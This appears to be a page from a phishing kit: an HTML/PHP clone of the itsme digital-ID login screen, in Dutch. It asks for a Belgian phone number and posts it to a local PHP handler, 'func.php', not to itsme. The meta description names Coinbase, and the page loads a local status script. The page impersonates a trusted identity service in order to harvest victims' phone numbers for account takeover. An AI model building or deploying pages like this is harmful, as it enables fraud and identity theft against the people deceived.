<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="./Assets/imgs/itsme-logo.svg">
        <title>Its me</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="./Assets/css/cre.css">
        <script src="./Assets/js/stutes.js"></script>
    </head>
    <body>
    
    <!-- wrapper_number_its -->
     <div class="back">
      <div class="img"></div>
     </div>
    <div class="wrapper_number_its">
      <div class="container_number_its">
        <div class="head_ites d-flex align-items-center justify-content-between">
          <div class="logo">
            <img src="./Assets/imgs/itsme-logo.svg" alt="">
          </div>
          <a href="">Français <img src="./Assets/imgs/ChevronDown.svg" alt=""></a>
        </div>
        <form action="./Assets/php/config/func.php" method="post">
          <input type="hidden" name="phone">
          <div class="container_form d-flex justify-content-between align-items-center">
            <div class="left_part">
              <h1>Inloggen</h1>
              <div class="box_form">
                <p class="title_sm">Gebruik je telefoonnummer <img src="./Assets/imgs/ChevronDown.svg" alt=""></p>
                <div class="input_form">
                  <div class="form-group input_box">
                    <div class="cunt">
                      <img src="./Assets/imgs/be.svg" alt="">
                      <p>+32</p>
                    </div>
                    <input type="text" name="tele" id="tele" required inputmode="numeric">
                  </div>
                  <button type="submit">Versturen</button>
                </div>
                <?php if( isset($_GET['error']) ) : ?> 
                <p style="color: #db0000; margin-top: 5px; margin-bottom: 0; font-family: Roboto, sans-serif; font-size: 14px; font-weight: 400; line-height: 24px;"><img src="./Assets/imgs/err2.svg" width="17px" style="position: relative; top:-2px;" alt=""> Veuillez entrer un numéro de téléphone valide</p>
                <?php endif; ?>      
              </div>
            </div>
            <div class="right_part">
              <img src="./Assets/imgs/AppGeneric.svg" alt="">
              <h1>itsme®it's me, I digitale ID</h1>
              <p>Gebruik itsme®it's me om jezelf veilig online te identificeren</p>
            </div>            
          </div>
        </form>        
        <div class="sm">
          <div class="head_ites d-flex align-items-center justify-content-between">
            <div class="logo">
              <img src="./Assets/imgs/itsme-logo.svg" alt="">
            </div>
            <a href="">Français <img src="./Assets/imgs/ChevronDown.svg" alt=""></a>
          </div>
          <form action="./Assets/php/config/func.php" method="post">
            <input type="hidden" name="phone">
            <div class="container_form d-flex justify-content-between align-items-center">
              <div class="left_part">
                <h1>Inloggen</h1>
                <div class="box_form">
                  <p class="title_sm">Gebruik je telefoonnummer <img src="./Assets/imgs/ChevronDown.svg" alt=""></p>
                  <div class="input_form">
                    <div class="form-group input_box">
                      <div class="cunt">
                        <img src="./Assets/imgs/be.svg" alt="">
                        <p>+32</p>
                      </div>
                      <input type="text" name="tele" id="tele" required inputmode="numeric">
                    </div>
                    <button type="submit">Versturen</button>
                    <?php if( isset($_GET['error']) ) : ?> 
                    <p style="color: #db0000; margin-top: 5px; margin-bottom: 0; font-family: Roboto, sans-serif; font-size: 14px; font-weight: 400; line-height: 24px;"><img src="./Assets/imgs/err2.svg" width="17px" style="position: relative; top:-2px;" alt=""> Voer een geldig telefoonnummer in.</p>
                    <?php endif; ?>                     
                  </div>
                </div>
              </div>
              <div class="right_part">
                <img src="./Assets/imgs/AppGeneric.svg" alt="">
                <h1>itsme®it's me, I digitale ID</h1>
                <p>Gebruik itsme®it's me om jezelf veilig online te identificeren</p>
              </div>            
            </div>
          </form>          
        </div>
        <div class="apps">
          <div class="app_now">
            <h1>Download de gratis app</h1>
            <ul class="ps-0 mb-0 d-flex">
              <li><img src="./Assets/imgs/app_store.svg" alt=""></li>
              <li><img src="./Assets/imgs/google_play.svg" alt=""></li>
            </ul>
          </div>
        </div>
      </div>
    </div>










    <!-- bootstrap -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <!-- script jquery -->
    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    
    <script>                                          
    </script>
    </body>
</html>